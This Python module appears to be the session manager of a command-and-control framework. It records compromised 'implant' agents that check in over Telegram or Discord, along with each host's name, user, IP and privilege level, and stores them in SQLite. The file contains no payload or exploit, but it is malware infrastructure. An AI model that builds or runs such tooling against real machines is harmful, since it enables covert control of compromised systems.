"""
Session manager — tracks every live implant connection.
Each Session represents one agent checked into the framework.

Sessions are persisted to SQLite so a server restart does not lose agents.
The in-memory dict is the live cache; DB is the authoritative store.
"""
from __future__ import annotations

import json
import sqlite3
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Iterator, Optional


@dataclass
class Session:
    # ── identity ──────────────────────────────────────────────────────────
    agent_id: str
    hostname: str    = "unknown"
    os: str          = "unknown"
    arch: str        = "unknown"
    username: str    = "unknown"
    ip: str          = "unknown"

    # ── privilege ─────────────────────────────────────────────────────────
    priv_level: str  = "user"       # user / admin / system

    # ── transport ─────────────────────────────────────────────────────────
    transport: str   = "telegram"   # telegram / discord
    group_id: str    = ""           # Telegram group ID for this agent

    # ── timing ────────────────────────────────────────────────────────────
    first_seen: float = field(default_factory=time.time)
    checkin_at: float = field(default_factory=time.time)

    # ── metadata ──────────────────────────────────────────────────────────
    tags: list[str]  = field(default_factory=list)
    note: str        = ""

    # ── history (in-memory touch log) ─────────────────────────────────────
    _history: list[dict] = field(default_factory=list, repr=False)

    # ── methods ───────────────────────────────────────────────────────────
    def touch(self, action: str, result: str = "ok") -> None:
        self.checkin_at = time.time()
        self._history.append({
            "time":   time.strftime("%H:%M:%S"),
            "action": action,
            "result": result,
        })

    def update_checkin(self) -> None:
        self.checkin_at = time.time()

    def is_stale(self, ttl: int = 300) -> bool:
        return (time.time() - self.checkin_at) > ttl

    def age(self) -> int:
        return int(time.time() - self.checkin_at)

    def uptime(self) -> str:
        secs = int(time.time() - self.first_seen)
        h, m = divmod(secs // 60, 60)
        s = secs % 60
        return f"{h:02d}:{m:02d}:{s:02d}"

    def history(self, n: int = 20) -> list[dict]:
        return self._history[-n:]

    def add_tag(self, tag: str) -> None:
        if tag not in self.tags:
            self.tags.append(tag)

    # ── display ───────────────────────────────────────────────────────────
    def one_line(self) -> str:
        seen = f"{self.age()}s ago"
        return (
            f"  {self.agent_id:<14}  {self.hostname:<20}  "
            f"{self.os:<14}  {self.priv_level:<8}  "
            f"{self.transport:<10}  {seen}"
        )

    def detail(self) -> str:
        first = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(self.first_seen))
        last  = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(self.checkin_at))
        return (
            f"\n  Agent ID   : {self.agent_id}"
            f"\n  Hostname   : {self.hostname}"
            f"\n  Username   : {self.username}"
            f"\n  OS         : {self.os} ({self.arch})"
            f"\n  IP         : {self.ip}"
            f"\n  Privilege  : {self.priv_level}"
            f"\n  Transport  : {self.transport}"
            f"\n  Group ID   : {self.group_id or '—'}"
            f"\n  First seen : {first}"
            f"\n  Last seen  : {last}  ({self.age()}s ago)"
            f"\n  Uptime     : {self.uptime()}"
            f"\n  Tags       : {', '.join(self.tags) or '—'}"
            f"\n  Note       : {self.note or '—'}"
        )

    def __str__(self) -> str:
        return self.one_line()


# ── DB helpers ────────────────────────────────────────────────────────────────

_CREATE_TABLE = """
CREATE TABLE IF NOT EXISTS agents (
    agent_id   TEXT PRIMARY KEY,
    hostname   TEXT,
    os         TEXT,
    arch       TEXT,
    username   TEXT,
    ip         TEXT,
    priv_level TEXT,
    transport  TEXT,
    group_id   TEXT,
    first_seen REAL,
    checkin_at REAL,
    tags       TEXT,
    note       TEXT
)
"""


def _row_to_session(row: dict) -> Session:
    tags = json.loads(row["tags"]) if row["tags"] else []
    return Session(
        agent_id   = row["agent_id"],
        hostname   = row["hostname"]   or "unknown",
        os         = row["os"]         or "unknown",
        arch       = row["arch"]       or "unknown",
        username   = row["username"]   or "unknown",
        ip         = row["ip"]         or "unknown",
        priv_level = row["priv_level"] or "user",
        transport  = row["transport"]  or "telegram",
        group_id   = row["group_id"]   or "",
        first_seen = row["first_seen"] or time.time(),
        checkin_at = row["checkin_at"] or time.time(),
        tags       = tags,
        note       = row["note"]       or "",
    )


def _session_to_row(s: Session) -> tuple:
    return (
        s.agent_id,
        s.hostname,
        s.os,
        s.arch,
        s.username,
        s.ip,
        s.priv_level,
        s.transport,
        s.group_id,
        s.first_seen,
        s.checkin_at,
        json.dumps(s.tags),
        s.note,
    )


class SessionManager:
    def __init__(self, checkin_ttl: int = 300, db_path: str = ":memory:"):
        self._sessions: dict[str, Session] = {}
        self.checkin_ttl = checkin_ttl
        self._lock = threading.Lock()

        db_file = Path(db_path)
        db_file.parent.mkdir(parents=True, exist_ok=True)
        self._db = sqlite3.connect(str(db_file), check_same_thread=False)
        self._db.row_factory = sqlite3.Row
        self._db.execute(_CREATE_TABLE)
        self._db.commit()

        # Pre-warm cache from DB
        for row in self._db.execute("SELECT * FROM agents"):
            s = _row_to_session(dict(row))
            self._sessions[s.agent_id] = s

    # ── registration ──────────────────────────────────────────────────────
    def register(self, agent_id: str, **info) -> tuple[Session, bool]:
        """
        Register or update a session.
        Returns (session, is_new) so callers know whether to notify.
        """
        with self._lock:
            if agent_id in self._sessions:
                s = self._sessions[agent_id]
                s.update_checkin()
                for k, v in info.items():
                    if hasattr(s, k):
                        setattr(s, k, v)
                self._upsert_db(s)
                return s, False

            s = Session(agent_id=agent_id, **info)
            self._sessions[agent_id] = s
            self._upsert_db(s)
            return s, True

    def remove(self, agent_id: str) -> Optional[Session]:
        with self._lock:
            s = self._sessions.pop(agent_id, None)
            self._db.execute("DELETE FROM agents WHERE agent_id=?", (agent_id,))
            self._db.commit()
            return s

    # ── lookup ────────────────────────────────────────────────────────────
    def get(self, agent_id: str) -> Optional[Session]:
        with self._lock:
            if agent_id in self._sessions:
                return self._sessions[agent_id]
            # Try DB
            row = self._db.execute(
                "SELECT * FROM agents WHERE agent_id=?", (agent_id,)
            ).fetchone()
            if row:
                s = _row_to_session(dict(row))
                self._sessions[agent_id] = s
                return s
            return None

    def require(self, agent_id: str) -> Session:
        s = self.get(agent_id)
        if not s:
            raise KeyError(f"No session for agent_id={agent_id!r}")
        return s

    def touch(self, agent_id: str, action: str = "checkin", result: str = "ok") -> None:
        """Update checkin timestamp in memory and DB."""
        with self._lock:
            s = self._sessions.get(agent_id)
            if s:
                s.touch(action, result)
                self._db.execute(
                    "UPDATE agents SET checkin_at=? WHERE agent_id=?",
                    (s.checkin_at, agent_id),
                )
                self._db.commit()

    # ── iteration ─────────────────────────────────────────────────────────
    def all(self) -> Iterator[Session]:
        with self._lock:
            # Merge DB rows not in memory cache
            for row in self._db.execute("SELECT * FROM agents"):
                aid = row["agent_id"]
                if aid not in self._sessions:
                    s = _row_to_session(dict(row))
                    self._sessions[aid] = s
            yield from list(self._sessions.values())

    def alive(self) -> list[Session]:
        return [s for s in self.all()
                if not s.is_stale(self.checkin_ttl)]

    def stale(self) -> list[Session]:
        return [s for s in self.all()
                if s.is_stale(self.checkin_ttl)]

    def count(self) -> int:
        with self._lock:
            return len(self._sessions)

    # ── display ───────────────────────────────────────────────────────────
    def table(self) -> str:
        sessions = list(self.all())
        if not sessions:
            return "  No sessions registered."

        header = (
            f"\n  {'ID':<14}  {'HOST':<20}  {'OS':<14}  "
            f"{'PRIV':<8}  {'TRANSPORT':<10}  LAST SEEN"
            f"\n  {'─'*14}  {'─'*20}  {'─'*14}  "
            f"{'─'*8}  {'─'*10}  {'─'*10}"
        )
        rows   = "\n".join(s.one_line() for s in sessions)
        alive  = len(self.alive())
        footer = f"\n\n  {alive}/{len(sessions)} alive"
        return f"{header}\n{rows}{footer}"

    # ── internal ──────────────────────────────────────────────────────────
    def _upsert_db(self, s: Session) -> None:
        self._db.execute(
            "INSERT OR REPLACE INTO agents "
            "(agent_id,hostname,os,arch,username,ip,priv_level,transport,"
            " group_id,first_seen,checkin_at,tags,note) "
            "VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
            _session_to_row(s),
        )
        self._db.commit()
